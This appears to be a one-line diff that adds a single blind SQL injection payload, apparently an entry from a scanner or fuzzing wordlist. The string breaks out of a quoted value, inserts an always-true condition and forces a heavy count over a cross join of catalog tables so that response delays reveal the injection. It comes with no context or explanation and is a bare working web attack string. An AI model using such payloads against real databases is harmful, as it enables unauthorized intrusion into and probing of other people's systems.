@@ -1,0 +1,1 @@
+1') as bdei where 9531=9531 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
